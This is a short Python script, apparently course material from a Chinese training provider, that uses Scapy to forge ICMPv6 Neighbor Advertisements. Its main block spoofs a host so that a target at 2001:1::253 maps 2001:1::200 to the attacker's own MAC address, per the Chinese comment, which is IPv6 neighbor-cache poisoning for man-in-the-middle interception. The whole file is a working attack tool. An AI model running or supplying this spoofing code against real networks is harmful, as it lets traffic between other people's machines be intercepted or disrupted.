#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# 本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
# 教主QQ:605658506
# 亁颐堂官网www.qytang.com
# 教主技术进化论拓展你的技术新边疆
# https://ke.qq.com/course/271956?tuin=24199d8a

# IPv6参考文档
# https://www.idsv6.de/Downloads/IPv6PacketCreationWithScapy.pdf
# https://www.ernw.de/download/Advanced%20Attack%20Techniques%20against%20IPv6%20Networks-final.pdf


import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错
from scapy.all import *
from Tools.GET_MAC_netifaces import get_mac_address
from ICMPv6_NS import icmpv6_ns


def icmpv6_na(spoofhost, dsthost, ifname):
    ll_mac = get_mac_address(ifname)
    ether = Ether(dst=icmpv6_ns(dsthost, ifname))
    base = IPv6(src=spoofhost, dst=dsthost)
    neighbor_advertisements = ICMPv6ND_NA(tgt=spoofhost, R=0, S=0, O=1)
    src_ll_addr = ICMPv6NDOptDstLLAddr(lladdr=ll_mac)
    packet = ether / base / neighbor_advertisements / src_ll_addr
    sendp(packet,verbose=False)


if __name__ == '__main__':
    # 欺骗2001:1::253 让它认为2001:1::200的MAC地址为本地攻击者计算机的MAC
    icmpv6_na("2001:1::200", "2001:1::253", "ens33")
